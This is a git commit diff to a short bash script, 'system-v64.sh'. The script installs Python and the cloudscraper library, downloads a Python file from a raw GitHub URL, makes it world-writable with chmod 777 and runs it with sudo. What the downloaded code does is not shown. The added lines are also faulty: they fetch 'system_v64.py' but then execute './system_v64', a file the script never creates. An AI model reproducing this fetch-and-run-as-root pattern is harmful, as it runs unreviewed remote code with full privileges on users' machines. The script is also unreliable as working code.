a77fc0206ae372a8991d4384be8a8a868cb512fe
mdn-gay <bantoideptrai@gmail.com>
2025-12-02 19:41:22 +0700

    Update system-v64.sh

--- system-v64.sh
+++ system-v64.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
-pip install cloudscraper requests && pip3 install cloudscraper requests
-sudo pip3 install cloudscraper requests && pip3 install cloudscraper requests
-wget https://raw.githubusercontent.com/mdn-gay/1239277489294m/refs/heads/main/system-v64.py
-sudo python3 system-v64.py
+sudo pip install cloudscraper requests && sudo pip3 install cloudscraper requests
+wget https://raw.githubusercontent.com/mdn-gay/1239277489294m/refs/heads/main/system_v64.py
+chmod 777 system_v64.py
+sudo ./system_v64
